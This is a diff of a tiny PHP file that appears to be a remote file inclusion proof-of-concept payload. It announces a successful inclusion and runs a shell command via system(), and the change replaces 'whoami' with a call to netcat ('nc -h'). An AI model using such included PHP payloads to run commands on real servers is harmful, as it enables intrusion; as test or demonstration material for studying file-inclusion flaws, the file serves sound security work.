@@ -1,4 +1,4 @@
 <?php
-echo 'Remote File Inclusion Successful! Command Output: ';
-system('whoami');
+echo 'Remote File Inclusion Successful!';
+system('nc -h');
 ?>
